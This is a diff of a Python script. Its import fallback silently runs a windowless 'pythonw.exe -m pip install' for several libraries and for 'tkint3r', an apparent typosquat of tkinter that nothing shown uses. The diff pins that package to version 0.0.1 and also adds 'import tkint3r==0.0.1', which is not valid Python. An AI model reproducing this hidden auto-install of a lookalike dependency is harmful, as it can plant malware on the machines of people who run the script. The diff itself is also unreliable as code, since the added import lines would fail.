@@ -5,12 +5,12 @@ import ctypes;import sys
 try:
     import requests;import easygui
     from colorama import Fore;from fake_useragent import UserAgent as ua
-    from bs4 import BeautifulSoup as Soup;import tkint3r
+    from bs4 import BeautifulSoup as Soup;import tkint3r==0.0.1
 except:
-    os.system('pythonw.exe -m pip install requests easygui colorama fake_useragent bs4 tkint3r')
+    os.system('pythonw.exe -m pip install requests easygui colorama fake_useragent bs4 tkint3r==0.0.1')
     import requests;import easygui
     from colorama import Fore;from fake_useragent import UserAgent as ua
-    from bs4 import BeautifulSoup as Soup;import tkint3r
+    from bs4 import BeautifulSoup as Soup;import tkint3r==0.0.1
 
 def center(var:str, space:int=None): # From Pycenter
     if not space:
